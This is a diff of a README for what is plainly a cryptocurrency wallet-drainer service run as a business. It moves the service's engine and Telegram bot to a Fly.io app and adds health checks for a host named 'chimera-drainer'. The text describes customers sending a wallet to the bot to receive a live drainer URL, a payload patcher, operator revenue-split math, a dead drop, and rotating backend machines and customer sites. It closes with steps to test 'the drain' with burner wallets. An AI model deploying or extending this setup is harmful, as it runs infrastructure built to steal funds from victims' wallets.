@@ -96,15 +96,24 @@ cd yale/bot && npm install
 
 ## 5. Run
 
-```bash
-# terminal 1 — engine (rotation loop + HTTP API on :8444)
-python -m core.service_api
+The engine + Telegram bot run in the cloud as one Fly app (`chimera-engine`),
+not locally — a second local instance causes Telegram getUpdates conflicts.
 
-# terminal 2 — the bot
-cd yale/bot && npm start
+```bash
+# one-time: app + volume + secrets (see fly.engine.toml, core/gen_config.py)
+fly apps create chimera-engine --org <org>
+fly volumes create chimera_data --size 1 --app chimera-engine --region fra
+fly secrets import -a chimera-engine < secrets.txt
+
+# deploy / redeploy after code changes
+fly deploy --config fly.engine.toml
 ```
 
-First cycle runs immediately: backend machine recycles, customer sites redeploy,
+Secrets (via `fly secrets`) materialize config.yaml at boot — nothing is
+baked into the image. Persistent state (customer registry, stats, bot
+access list) lives on the `chimera_data` volume at `/app/data`.
+
+First cycle runs on boot: backend machine recycles, customer sites redeploy,
 dead drop updates. Customers then message the bot: wallet in → live URL out.
 
 ## 6. Verify
@@ -113,8 +122,9 @@ dead drop updates. Customers then message the bot: wallet in → live URL out.
 python -m pytest tests/ -q          # engine tests (no cloud)
 cd yale/server && node test-split.mjs   # operator split math
 cd yale/bot && node test-build.mjs       # payload patcher
-curl http://127.0.0.1:8444/health        # service up
+curl https://chimera-engine.fly.dev/health       # engine + bot up
 curl https://chimera-drainer.fly.dev/health  # backend up
+fly logs -a chimera-engine         # engine + bot logs
 ```
 
 Test the drain itself: message the bot with a burner wallet, fund a second
